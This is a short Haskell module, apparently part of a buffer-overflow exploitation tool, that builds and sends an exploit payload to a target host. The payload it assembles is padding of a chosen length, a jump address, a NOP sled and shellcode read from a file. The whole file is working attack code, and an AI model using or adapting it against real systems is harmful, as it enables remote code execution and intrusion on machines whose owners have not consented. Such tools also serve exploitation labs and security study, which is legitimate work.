module Overflow.Exploit
( sendExploit
) where

import Overflow
import Data.Text (Text, unpack)

-- |...
sendExploit :: Host -> Int -> Text -> FilePath -> Affix -> IO () 
sendExploit h o j f a = do
        putStrLn "    ───> Sending exploit payload to target..."
        shell <- readFile f
        sendPayload h (createPayload (payload shell) a) >>= printResult
    where
        overflow      = replicate o 'A'
        nopslide      = replicate 16 '\x90'
        payload shell = overflow ++ (unpack j) ++ nopslide ++ shell

-- ...
printResult :: Bool -> IO ()
printResult x
    | x         = putStrLn "Done! Finished sending exploit to target."
    | otherwise = putStrLn "Error: An error occurred sending payload to target."
